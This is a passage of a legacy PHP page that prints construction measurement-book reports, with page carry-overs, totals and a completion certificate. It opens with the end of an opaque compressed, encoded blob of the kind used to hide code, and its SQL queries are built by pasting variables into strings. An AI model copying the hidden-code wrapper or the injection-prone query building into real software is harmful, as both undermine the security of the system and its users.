eC6LwnWtHxTdiEU0B7tk5gK7sxpjgaH/4tgWNcZ9jEdX7tAdkzcXsDfzZhNJIVlIW/b8xYD3bwcwKhTaexIVWTbtVT82z38H1rhhTKnXmpjb8gwJP1zlhBHMhzRRwB87hWmMUz3ABzpIlwXZTYnYszxV8/Un6pTkQeYDQrZiZ+NbYaXSksziqpbwtFts1e1ijHPLQ9MfEHgZKteBGTXSF6laM/kDboWoIoldjpUW2bwuvK56caWO23jYnhHjEpo0sHdtgbPtrFQnfPArrthpM7CAQ8tAuvE8eawfuACwZBFuklzTGbKLH+TSYKu+P2MeDiF2KuXjWxQoO7U2kJMv20ZNv4naoG8BI21okRw9NU7zYGHWDpCvvH5lbYAodT6xvHAFY2EY9sR2lWvkfKmimPCnyI/L8g046tCmbf3pOoyqDz84uuxBdzxp0CurjHNMG7EVhX+DUXRUKPLZlyGxqfWSkI66mUOg+NOAoebSLdXp2VDBQ5LLT4NFvV/tvvjIP63eu2nN7uFbtb8lcP2T57oxwdUgJfoBUYsXTwwxim/Gm6XFqFYarzS4suh98L0seg9PDm759jI1n/TXLR2WHoH6Rk1DrvffB+bLwEK3LkSOox7Z7FhbVSp3o5/WFRwz+pYDFbguZocBmCfkSSTbBUU19disLsFHwp+rmjtvMOy0cJILYBnRn8Z0nuP8BvIenD8FKDO++gG+DvX9fysrObLrANdm1FDB70uYNXwggCcTpXIDcs1T9xy7c2/8IXVaLYCtaNZ2R/l0EZ4tVjbaBJ4qV/aOLq9ED/Eea0EZJC2KU32lHqZMsgeugjq11PbqwOoDGGkJGKwxZ9A5Gd0jVSf8nRv+oKkzsUzX2JP/VErxoMBqcOi38TZUeYAhQ/O3YS0FQ+b+vqjqv+RrqWZWSvR6hVvQA2roKNdLePrmw5He2n1CLW4N5GmtgURVqHGSW19nx7enFhCoMRtmC/5VmBOz8CwaoCRSyXjwbN8HRL0xcOZ8xUIsWiBMLy9DxYE2Mha7G3MqYhMD0NFEmUYVOdnXqHRi4ou6RHgWgWMsElE84NoMm/3hsrt1IX0ONswcfd6mn5WtaKQ3HBIQYsAjRBznFuvMOphs2gjeOhaeISHmlqCU5/a56KvP0Dg0fg06gG5Q44AVOXXr3T5adY7GHRlvkU/OiTH71fzvAxMWV0VodSW+axeUwwsqU2PZCIABt6m6eRVdzLAoGDD1z1Ie3R2mZ/PlT+s7e8ObsUyVidjX/gM8cAu568DlD+nfJInmMzrxhd/ya6Mdo6iBoXjK7jkkbczg5rN18cI9VGuwtagg5Lxwtp17tWf6kA4cMyZQMm8p6Dauk6GvO3ignekwAnyypaKiYx4Frlo49fumTqEspl1wW5NyBFPLrF/fyhRFXX1SbcNIWZOOrEvKHqofb0OrIvmMAdDYxs395EPJ+yur0scjr5HNYRUK82W7+FTRPuKXS3roscJpV6VR2B52qFCei4L7thsIfDVXI+uNHLU9F8qqbgAfKLuQgXPfVe3Z/KbzMBYyi9AEY8/arDwz7Z/iSh9+GU8N4Zl1kpH2mKD2bXzQr6nAT91866wIIm5RT756h5+lZzotxRoN7gLpvZLm17VDPL7d8it+xQCe3tGDxGMB03aFY5Sskis3tbpTarp1kvsExdlyeHur5JBoD9dizrG3J2FnhGOyIlrmiYhsRnGuDVLe9tq/UZEAuv+W830z6PEX7D597/e37//AQ==')))));
                //echo $query ;exit;
$sqlquery = mysql_query($query);
if ($sqlquery == true) {
	while ($List = mysql_fetch_object($sqlquery)) 
	{
		$decimal = get_decimal_placed($List->subdivid,$sheetid);
		$measurement_contentarea = round($List->measurement_contentarea,$decimal);
		//if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
		/*if($page > 100){
			$currentline = $start_line + 7;
			$prevpage = 100;
			$page = $newmbookpageno;
			//$prevpage = $mpage;
			//$oldmbookno = $mbookno;
			$mbookno = $newmbookno;
		}*/
		if($currentline>40)
		{ 
		
		?>
		<tr height="" class="labelbold">
				<td width="81" align="center"></td>
				<td width="48" align="center"></td>
				<td colspan="5" align="right">
				<?php /*if($page == 100){ echo "C/o to page ".(0+1)." /General MB No.".$newmbookno; }else { echo "C/o to page ".($page+1)." /General MB No.".$mbookno; }*/ ?>
				C/o to page <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/General MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/General MB No.<?php echo $mbookno; } ?>
				</td>
				<td width="65" align="right"><?php if($contentarea != 0) { echo number_format($contentarea,$prev_decimal,".",","); } ?></td>
				<td width="32"><?php echo "&nbsp"; ?></td>
		</tr>
	<?php
		echo check_line($title,$table,$page,$mbookno,$NextMBList[$NextMbIncr],$table1);
?>
			<tr height="" class="labelbold">
				<td width="81" align="center"></td>
				<td width="48" align="center"></td>
				<td colspan="5" align="right"><?php echo "B/f from page ".$page." /General MB No.".$mbookno; ?></td>
				<td width="65" align="right"><?php if($contentarea != 0) { echo number_format($contentarea,$prev_decimal,".",","); } ?></td>
				<td width="32"><?php echo "&nbsp"; ?></td>
			</tr>
<?php 			
			$currentline = $start_line + 7; $page++;
			/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
			if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
		}
		if($List->subdivid != $prev_subdivid) // THIS IS FOR PRINT DATE, SHORTNOTE AND ITEM NAME
		//if(($List->subdivid != $prev_subdivid) || (($List->subdivid != $prev_subdivid) &&($prev_date != $List->date) && ($prev_date != "")))// THIS IS FOR PRINT DATE, SHORTNOTE AND ITEM NAME
		{
		$querycount = "SELECT COUNT(DISTINCT date) FROM mbookheader WHERE mbookheader.date  >= '$fromdate' AND mbookheader.date  <= '$todate' AND subdivid = '$List->subdivid' AND mbookheader.staffid = '$staffid' ".$zone_clause;
		//echo $querycount."<br/>";
		$querycount_sql = mysql_query($querycount);
		$res = mysql_fetch_array($querycount_sql); 
		$rowcount = $res[0];
				if($prev_subdivid != "")
				{
		?>
					<tr height="" class="labelbold">
						<td width="81"><?php echo "&nbsp"; ?></td>
						<td width="48" align="center"><?php echo "&nbsp"; ?></td>
						<td width="390" align="right">
						<?php 
						if($prev_measure_type != 'st')
						{
							if($prev_rowcount>1)
							{ 
							?>
							<input type="text" class="labelbold" name="txt_page"  style="width:100%; border:none; text-align:right;" id="txt_page<?php echo $txtboxid; ?>" />
							<?php 
							} 
							else 
							{ 
							echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); 
							//echo $prev_subdivid;
							}
						}
						?>
						</td>
						<td width="35" align="center"><?php echo "&nbsp"; ?></td>
						<td width="65" colspan="3" align="right">
						<?php 
						if($prev_measure_type != 'st')
						{
							echo "Total";
						}
						?>
						</td>
						<td width="65" align="right"><?php echo number_format($contentarea,$prev_decimal,".",","); ?></td>
						<td width="32" align="center">
						<?php 
							if($prev_measure_type != 'st')
							{
								echo $prev_remarks;
							}
							{
								echo $prev_struct_unit;
							}
						?>
						</td>
					</tr>
					<?php 
					if($prev_measure_type == 'st')
					{
						$contentarea = ($contentarea/1000);
					?>
						<tr height="" class="labelbold">
							<td width="81"><?php echo "&nbsp"; ?></td>
							<td width="48" align="center"><?php echo "&nbsp"; ?></td>
							<td width="390" align="right">
							<?php 
							if($prev_rowcount>1)
							{ 
							?>
							<input type="text" class="labelbold" name="txt_page"  style="width:100%; border:none; text-align:right;" id="txt_page<?php echo $txtboxid; ?>" />
							<?php 
							} 
							else 
							{ 
							echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); 
							}
							?>
							</td>
							<td width="35" align="center"><?php echo "&nbsp"; ?></td>
							<td width="65" colspan="3" align="center" class="labelcontentblue">Total</td>
							<td width="65" align="right" class="labelcontentblue">
							<?php echo number_format($contentarea,$prev_decimal,".",","); ?>
							</td>
							<td width="32" align="center"><?php echo $prev_remarks; ?></td>
						</tr>
					<?php
					}
					if(($prev_date != $List->date) && ($prev_date != ""))
					{
						echo "<tr style='border:none'><td style='border:none' colspan='9'>&nbsp</td></tr>";
						echo "<tr style='border:none'><td style='border:none' align='right' colspan='9'>&nbsp</td></tr>";
						echo "<tr style='border:none'><td style='border:none' align='center' colspan='3'></td><td style='border:none' align='left' colspan='3'>Checked By</td><td style='border:none' align='center' colspan='3'>Prepared By</td></tr>";
						$currentline+=3;
					}
					/*if($prev_rowcount == 1)
					{
						mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$page,$contentarea,$abstmbookno,$rbn,$userid);
					}*/
					$sum1 .= $prev_subdivname.",".$prev_date.",".$prev_subdivid.",".$prev_divid.",".$contentarea.",".$prev_rowcount.",".$page.",".$txtboxid.",".$prev_decimal.",".$prev_remarks."@"; 
					$prev_contentarea = 0;
					$currentline++;	
				}
				if($List->shortnotes == ""){ $List->shortnotes = $List->description; }
				//$len1 = strlen($List->shortnotes);
				//echo $length."<br/>";
				//$line_cnt1 = ceil($len1/96);
				//echo $List->subdiv_name." = ".$line_cnt1."<br/>";
				$snotes = $List->shortnotes;
				$degcelsius = "&#8451";
				$shortnotes = str_replace("DEGCEL","$degcelsius",$snotes);
				
				//  find the number of lines in item description
				$wrap_cnt1 = 0;
				$WrapReturn1 = getWordWrapCount($shortnotes,90);
				$shortnotes = $WrapReturn1[0];
				$wrap_cnt1 = $WrapReturn1[1];
				//echo $wrap_cnt1;
		?>
			<!--<tr height="">
				<td width="81" align="center"></td>
				<td width="48" align="center"></td>
				<td colspan="5"></td>
				<td width="65">&nbsp;</td>
				<td width="32">&nbsp;</td>
			</tr>-->
			<tr height="">
				<td width="81" align="center"><?php echo $List->date; ?></td>
				<td width="48" align="center"><?php echo $List->subdiv_name; ?></td>
				<td colspan="5"><?php echo $shortnotes; ?></td>
				<td width="65"><?php echo "&nbsp"; ?></td>
				<td width="32"><?php echo "&nbsp"; ?></td>
			</tr>
		<?php
		$currentline = $currentline+$wrap_cnt1+1;
		}
		
//88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888//		
		if(($List->subdivid == $prev_subdivid) && ($prev_date != $List->date))
		{
		$querycount = "SELECT COUNT(DISTINCT date) FROM mbookheader WHERE mbookheader.date  >= '$fromdate' AND mbookheader.date  <= '$todate' AND subdivid = '$List->subdivid' AND mbookheader.staffid = '$staffid' ".$zone_clause;
		//echo $querycount."<br/>";
		$querycount_sql = mysql_query($querycount);
		$res = mysql_fetch_array($querycount_sql); 
		$rowcount = $res[0];
				if($prev_subdivid != "")
				{
		?>
					<tr height="" class="labelbold">
						<td width="81"><?php echo "&nbsp"; ?></td>
						<td width="48" align="center"><?php echo "&nbsp"; ?></td>
						<td width="390" align="right">
						<?php 
						if($prev_measure_type != 'st')
						{
							if($prev_rowcount>1)
							{ 
							?>
							<input type="text" class="labelbold" name="txt_page"  style="width:100%; border:none; text-align:right;" id="txt_page<?php echo $txtboxid; ?>" />
							<?php 
							} 
							else 
							{ 
							echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); 
							//echo $prev_subdivid;
							}
						}
						?>
						</td>
						<td width="35" align="center"><?php echo "&nbsp"; ?></td>
						<td width="65" colspan="3" align="right">
						<?php 
						if($prev_measure_type != 'st')
						{
							echo "Total";
						}
						?>
						</td>
						<td width="65" align="right"><?php echo number_format($contentarea,$prev_decimal,".",","); ?></td>
						<td width="32" align="center">
						<?php 
							if($prev_measure_type != 'st')
							{
								echo $prev_remarks;
							}
							{
								echo $prev_struct_unit;
							}
						?>
						</td>
					</tr>
					<?php 
					if($prev_measure_type == 'st')
					{
						$contentarea = ($contentarea/1000);
					?>
						<tr height="" class="labelbold">
							<td width="81"><?php echo "&nbsp"; ?></td>
							<td width="48" align="center"><?php echo "&nbsp"; ?></td>
							<td width="390" align="right">
							<?php 
							if($prev_rowcount>1)
							{ 
							?>
							<input type="text" class="labelbold" name="txt_page"  style="width:100%; border:none; text-align:right;" id="txt_page<?php echo $txtboxid; ?>" />
							<?php 
							} 
							else 
							{ 
							echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); 
							}
							?>
							</td>
							<td width="35" align="center"><?php echo "&nbsp"; ?></td>
							<td width="65" colspan="3" align="center" class="labelcontentblue">Total</td>
							<td width="65" align="right" class="labelcontentblue">
							<?php echo number_format($contentarea,$prev_decimal,".",","); ?>
							</td>
							<td width="32" align="center"><?php echo $prev_remarks; ?></td>
						</tr>
					<?php
					}
					if(($prev_date != $List->date) && ($prev_date != ""))
					{
						echo "<tr style='border:none'><td style='border:none' colspan='9'>&nbsp</td></tr>";
						echo "<tr style='border:none'><td style='border:none' align='right' colspan='9'>&nbsp</td></tr>";
						echo "<tr style='border:none'><td style='border:none' align='center' colspan='3'></td><td style='border:none' align='left' colspan='3'>Checked By</td><td style='border:none' align='center' colspan='3'>Prepared By</td></tr>";
						$currentline+=3;
					}
					/*if($prev_rowcount == 1)
					{
						mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$page,$contentarea,$abstmbookno,$rbn,$userid);
					}*/
					$sum1 .= $prev_subdivname.",".$prev_date.",".$prev_subdivid.",".$prev_divid.",".$contentarea.",".$prev_rowcount.",".$page.",".$txtboxid.",".$prev_decimal.",".$prev_remarks."@"; 
					$prev_contentarea = 0;
					$currentline++;	
				}
				if($List->shortnotes == ""){ $List->shortnotes = $List->description; }
				//$len1 = strlen($List->shortnotes);
				//echo $length."<br/>";
				//$line_cnt1 = ceil($len1/96);
				//echo $List->subdiv_name." = ".$line_cnt1."<br/>";
				$snotes = $List->shortnotes;
				$degcelsius = "&#8451";
				$shortnotes = str_replace("DEGCEL","$degcelsius",$snotes);
				
				//  find the number of lines in item description
				$wrap_cnt2 = 0;
				$WrapReturn2 = getWordWrapCount($shortnotes,90);
				$shortnotes = $WrapReturn2[0];
				$wrap_cnt2 = $WrapReturn2[1];
		?>
			<!--<tr height="">
				<td width="81" align="center"></td>
				<td width="48" align="center"></td>
				<td colspan="5"></td>
				<td width="65">&nbsp;</td>
				<td width="32">&nbsp;</td>
			</tr>-->
			<tr height="">
				<td width="81" align="center"><?php echo $List->date; ?></td>
				<td width="48" align="center"><?php echo $List->subdiv_name; ?></td>
				<td colspan="5"><?php echo $shortnotes; ?></td>
				<td width="65"><?php echo "&nbsp"; ?></td>
				<td width="32"><?php echo "&nbsp"; ?></td>
			</tr>
		<?php
		$currentline = $currentline+$wrap_cnt2+1;
		}
		
		
		
		
//88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888//			
				/*$work_desc = $List->descwork;
				$desc = wordwrap($work_desc,50,'<br>');
				$wwl = explode('<br>', $desc);
				$wwlcount = count($wwl);
				$wrap_cnt = 0; $descwork = "";
				for($xc=0; $xc<$wwlcount; $xc++)
				{
					if($wwl[$xc] != "")
					{
						$wrap_cnt++;
						$descwork .= $wwl[$xc]."<br/> ";
						//echo $xc." = ".$wwl[$xc]."<br/>";
					}
				}*/
				//  find the number of lines in work description
				$wrap_cnt3 = 0;	
				$WrapReturn3 = getWordWrapCount($List->descwork,50);
				$descwork = $WrapReturn3[0];
				$wrap_cnt3 = $WrapReturn3[1];
				
				//$descri = preg_replace('/[\n\r]+/', '', $desc);
				//echo $ccc."<br/>";
				//echo $desc."<br/>";
				//echo $wwlcount;exit;
				//print_r($wwl); echo "<br/>";
				
				
				
				//$len2 = strlen($List->descwork);
				//echo $length."<br/>";
				//$line_cnt2 = ceil($len2/55);
				//echo $List->subdiv_name." = ".$line_cnt2."<br/>";
		?>
		<!---  THE BELOW ROW IS FOR PRINT EACH RECORD ------>
			<tr height="">
				<td width="81"><?php echo "&nbsp"; ?></td>
				<td width="48"><?php //echo $currentline;//echo $wrap_cnt1."-".$wrap_cnt2."-".$ccc; ?></td>
				<td width="390"><?php echo $descwork; ?></td>
				<td width="35" align="right"><?php if($List->measurement_no != 0) { echo $List->measurement_no; } ?></td>
				<td width="65" align="right"><?php if($List->measurement_l != 0) { echo number_format($List->measurement_l,$decimal,".",","); } ?></td>
				<td width="65" align="right"><?php if($List->measurement_b != 0) { echo number_format($List->measurement_b,$decimal,".",","); } ?></td>
				<td width="65" align="right"><?php if($List->measurement_d != 0) { echo number_format($List->measurement_d,$decimal,".",","); } ?></td>
				<td width="65" align="right"><?php if($measurement_contentarea != 0) { echo number_format($measurement_contentarea,$decimal,".",","); } ?></td>
				<td width="32" align="center">
				<?php 
				 if($List->measurement_no != 0) 
				{ 
					if($List->measure_type == 'st')
					{
						//echo $List->structdepth_unit;
					}
					else
					{
						//echo $List->remarks; 
					}
				} 
				?>
				</td>
			</tr>
		<?php
		//$contentarea = round(($prev_contentarea + $measurement_contentarea),3);
		$contentarea = ($prev_contentarea + $measurement_contentarea);
		$prev_subdivid = $List->subdivid; $prev_subdivname = $List->subdiv_name; $prev_divid = $List->div_id; $prev_contentarea = $contentarea;
		$prev_date = $List->date; $prev_rowcount = $rowcount; $prevpage = $page; $prev_mbookno = $mbookno; $prev_struct_unit = $List->structdepth_unit;
		
		//$currentline = $currentline+$line_cnt2; 
		$currentline = $currentline+$wrap_cnt3; 
		
		$prev_measure_type = $List->measure_type; $prev_remarks = $List->remarks; $prev_decimal = $decimal;
		$txtboxid++; 
	} 
	?>
		<input type="hidden" name="txt_textboxcount" id="txt_textboxcount" value="<?php echo $txtboxid; ?>" />
		<!----  THIS ROW IS FOR PRINT TOTAL OF THE LAST ROW IN WHILE LOOP ----->
			<tr height="" class="labelbold">
				<td width="81"><?php echo "&nbsp"; ?></td>
				<td width="48" align="center"><?php echo "&nbsp"; ?></td>
				<td width="390" align="right">
				<?php 
						if($prev_measure_type != 'st')
						{
							if($prev_rowcount>1)
							{ 
							?>
							<input type="text" class="labelbold" name="txt_page"  style="width:100%; border:none; text-align:right;" id="txt_page<?php echo $txtboxid; ?>" />
							<?php 
							} 
							else 
							{ 
							echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); 
							//echo $prev_subdivid;
							}
						}
						?>
				</td>
				<td width="35" align="center"><?php echo "&nbsp"; ?></td>
				<td width="65" colspan="3" align="right">
				<?php 
						if($prev_measure_type != 'st')
						{
							echo "Total";
						}
						?>
				</td>
				<td width="65" align="right"><?php echo number_format($contentarea,$prev_decimal,".",","); ?></td>
				<td width="32" align="center">
				<?php 
					if($prev_measure_type != 'st')
					{
						echo $prev_remarks;
					}
					{
						echo $prev_struct_unit;
					}
				?>
				</td>
			</tr> 
			<?php 
			if($prev_measure_type == 'st')
			{
				$contentarea = ($contentarea/1000);
				
					?>
						<tr height="" class="labelbold">
							<td width="81"><?php echo "&nbsp"; ?></td>
							<td width="48" align="center"><?php echo "&nbsp"; ?></td>
							<td width="390" align="right">
							<?php 
							if($prev_rowcount>1)
							{ 
							?>
								<input type="text" class="labelbold" name="txt_page"  style="width:100%; border:none; text-align:right;" id="txt_page<?php echo $txtboxid; ?>" />
							<?php 
							} 
							else 
							{ 
								echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id);  
							}
							?>
							</td>
							<td width="35" align="center"><?php echo "&nbsp"; ?></td>
							<td width="65" colspan="3" align="right" class="labelcontentblue">Total</td>
							<td width="65" align="right" class="labelcontentblue">
							<?php echo number_format($contentarea,$prev_decimal,".",","); ?>
							</td>
							<td width="32" align="center"><?php echo $prev_remarks; ?></td>
						</tr>
					<?php
					}
					
						echo "<tr style='border:none'><td style='border:none' colspan='9'>&nbsp</td></tr>";
						echo "<tr style='border:none'><td style='border:none' align='right' colspan='9'>&nbsp</td></tr>";
						echo "<tr style='border:none'><td style='border:none' align='center' colspan='3'></td><td style='border:none' align='left' colspan='3'>Checked By</td><td style='border:none' align='center' colspan='3'>Prepared By</td></tr>";
						$currentline+=3;
					?>
</table> 
 
<?php  
		/*if($prev_rowcount == 1)
		{
			mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$page,$contentarea,$abstmbookno,$rbn,$userid);
		}*/
		$currentline+=3;
		$sum2 .= $prev_subdivname.",".$prev_date.",".$prev_subdivid.",".$prev_divid.",".$contentarea.",".$rowcount.",".$page.",".$txtboxid.",".$prev_decimal.",".$prev_remarks."@"; 
}
$sum = $sum1.$sum2;
$split_sum = explode('@',$sum);
natsort($split_sum);
// THIS "FOR EACH" STATEMENT IS FOR GENERATE STRING AFTER "SORTING"........
foreach($split_sum as $key => $summ)
{
   if($summ != "")
   {
      $summary .= $summ.",";
   }
}
//echo $summary;exit;
$summary1 = explode(',',rtrim($summary,","));
$prev_val = "";$count = 0;
// THIS IS FOR LOOP IS FOR CHECK WHETHER SUMMARY PART HAS TO BE PRINT OR NOT...
for($i=0;$i<count($summary1);$i+=10)
{
	if($summary1[$i+5]>1)
	{
		$count++;
	}
	$prev_val = $summary1[$i+5];
}
if($count>0)
{
	
	if($currentline>27)
	{
		//if($page == 100) { $mbookno = $newmbookno; }
			echo '<table width="875" style="border-style:none;" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" class="label">';
			echo '<tr style="border-style:none;"><td style="border-style:none;" colspan="9" align="center">Page '.$page.'&nbsp;&nbsp</td></tr>';
			echo '</table>';
			echo "<p  style='page-break-after:always;'></p>";
			$MbookDP = ''; if($page >= 100){ $MbookDP = $NextMBList[$NextMbIncr]; }else{ $MbookDP = $mbookno; }
			echo '<table width="875" border="0"  cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" style="border:none;" class="label">
				<tr style="border:none;"><td align="center" style="border:none;">General M.Book No. '.$MbookDP.'&nbsp;&nbsp;<br/>&nbsp;</td></tr>
				</table>';
			echo $table;
			$currentline = $start_line + 8;$page++;
			/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
			if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
		}
	//echo $page;
	/*if($page > 100){
		$page = $newmbookpageno;
		$mbookno = $newmbookno;
	}*/
	
	
	echo '<table width="875" border="0" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF"  class="label" style="border-style:none;">';
	echo '<tr style="border-style:none;"><td style="border-style:none;" colspan="9" align="center">Summary</td></tr>';
	$contentarea = 0;$prev_subdivid = "";
	
	for($i=0;$i<count($summary1);$i+=10)
	{
		//if($sheetid == 2)
		//{
		//sum_qty = round(sum_qty,$summary1[$i+8]);
			$sum_qty = round($summary1[$i+4],$summary1[$i+8]);
		//}
		//else
		//{
			//$sum_qty = $summary1[$i+4];
		//}
		
		if($currentline>40)
		{
		//if($page == 100) { $mbookno = $newmbookno; $page = $newmbookpageno; }
?>
<tr height="" class="labelbold">
	<td width="81" align="center"></td>
	<td width="48" align="center"></td>
	<td colspan="5" align="right">
	<?php /*if($page == 100){ echo "C/o to page ".(0+1)." /General MB No.".$newmbookno; }else { echo "C/o to page ".($page+1)." /General MB No.".$mbookno; }*/ ?>
	C/o to page <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/General MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/General MB No.<?php echo $mbookno; } ?>
	</td>
	<td width="65" align="right"><?php if($contentarea != 0) { echo number_format($contentarea,$pre_decimal,".",","); } ?></td>
	<td width="32"><?php echo "&nbsp"; ?></td>
</tr>
<?php echo check_line($title,$table,$page,$mbookno,$NextMBList[$NextMbIncr],$table1); ?>
<tr height="" class="labelbold">
	<td width="81" align="center"></td>
	<td width="48" align="center"></td>
	<td colspan="5" align="right"><?php echo "B/f from page ".$page." /General MB No.".$mbookno; ?></td>
	<td width="65" align="right"><?php if($contentarea != 0) { echo number_format($contentarea,$pre_decimal,".",","); } ?></td>
	<td width="32"><?php echo "&nbsp"; ?></td>
</tr>
<?php 
			$currentline = $start_line + 8;
			//if($page == 100){ $page = $newmbookpageno;  $mbookno = $newmbookno; }else{ $page++; }
			$page++;
			/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
			if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
			//$page++;
		}
		//echo "PRE ID".$page."<br/>";
		if($summary1[$i+5]>1)
		{
			if(($summary1[$i+2] != $prev_subdivid) && ($prev_subdivid != ""))
			{
?>
			<tr height="" class="labelbold">
				<td width="81"><?php echo "&nbsp"; ?></td>
				<td width="48" align="center"><?php echo "&nbsp"; ?></td>
				<td width="390" align="right"><?php echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); ?></td>
				<td width="35" align="center"><?php echo "&nbsp"; ?></td>
				<!--<td width="65" align="center"></td>
				<td width="65" align="center"></td>-->
				<td width="195" colspan="3" align="right"><?php echo "Total"; ?></td>
				<td width="65" align="right"><?php echo number_format($contentarea,$pre_decimal,".",","); ?></td>
				<td width="32" align="center"><?php echo $pre_remarks; ?></td>
			</tr>
<?php 		
	//$summary_b .= $summary1[$i+7].",".$page."*";echo getabstractpage($sheetid,$prev_subdivid);
	//mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$page,$contentarea,$abstmbookno,$rbn,$userid);
			$contentarea = 0;	$currentline++;		
			}
?>
		<tr height="">
			<td width="81"><?php echo $summary1[$i+1]; ?></td>
			<td width="48" align="center"><?php echo $summary1[$i]; ?></td>
			<td width="390"><?php echo "B/f from page no ".$summary1[$i+6]; ?></td>
			<td width="35" align="center"><?php echo "&nbsp"; ?></td>
			<td width="65" align="center"><?php echo "&nbsp"; ?></td>
			<td width="65" align="center"><?php echo "&nbsp"; ?></td>
			<td width="65" align="center"><?php echo "&nbsp"; ?></td>
			<td width="65" align="right"><?php echo number_format($sum_qty,$summary1[$i+8],".",","); ?></td>
			<td width="32" align="center"><?php echo "&nbsp"; ?></td>
		</tr>
<?php	
			$summary_b .= $summary1[$i+7].",".$page.",".$summary1[$i].",";
			$contentarea = $contentarea + $sum_qty;	$currentline++;
			$prev_subdivid = $summary1[$i+2]; $prev_subdivname = $summary1[$i]; $prev_divid = $summary1[$i+3];	$prev_textboxid = $summary1[$i+7];
			$pre_page = $page; $pre_decimal = $summary1[$i+8]; $pre_remarks = $summary1[$i+9];
		}
	}
?>
		<tr height="" border="1px" style="border-bottom:solid; border-bottom-color:#CACACA;" class="labelbold">
			<td width="81"><?php echo "&nbsp"; ?></td>
			<td width="48" align="center"><?php echo "&nbsp"; ?></td>
			<td width="390" align="right"><?php echo getcompositepage($sheetid,$prev_subdivid,$rbn,$zone_id); ?></td>
			<td width="35" align="center"><?php echo "&nbsp"; ?></td>
<!--		<td width="65" align="center"></td>
			<td width="65" align="center"></td>-->
			<td width="195" colspan="3" align="right"><?php echo "Total"; ?></td>
			<td width="65" align="right"><?php echo number_format($contentarea,$pre_decimal,".",","); ?></td>
			<td width="32" align="center"><?php echo $pre_remarks; ?></td>
		</tr>
<?php 
//mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$page,$contentarea,$abstmbookno,$rbn,$userid);
echo '</table>';


/*echo '<table width="875" style="border-style:none;" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" class="label">';
echo '<tr style="border-style:none;">
		<td style="border-style:none;" width="53%" align="right">&nbsp;<br/><br/><br/><br/>Page '.$page.'<br/><br/><br/><br/>&nbsp;&nbsp</td>
		<td style="border-style:none;" colspan="4" align="right">&nbsp;&nbsp</td>
		</tr>';
echo '</table>';*/
}
/*else
{
echo '<table width="875" style="border-style:none;" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" class="label">';
echo '<tr style="border-style:none;">
		<td style="border-style:none;" colspan="4" align="right">&nbsp;&nbsp;&nbsp</td>
		</tr>';
echo '<tr style="border-style:none;">
		<td style="border-style:none;" width="53%" align="right">Page '.$page.'&nbsp;&nbsp</td>
		<td style="border-style:none;" colspan="4" align="right">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/>&nbsp;</td>
		</tr>';
echo '</table>';
}*/
if($is_finalbill == "Y"){
	if($currentline>20){
		echo '<table width="875" style="border-style:none;" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" class="label">';
		echo check_line($title,$table,$page,$mbookno,$newmbookno,$table1);
		echo '</table>';
		$page++;
		/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
		if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
	}
?>
<table align="center" class="label" width="875" bgcolor="#FFFFFF">
      	<tr>
	    	<td colspan="9" align="center" class="label labelbold">Completion Certificate</td>
	  	</tr>
      	<tr>
			<td width="81"></td>
			<td colspan="2">Actual date of Completion: <?php echo dt_display($adoc); ?></td>
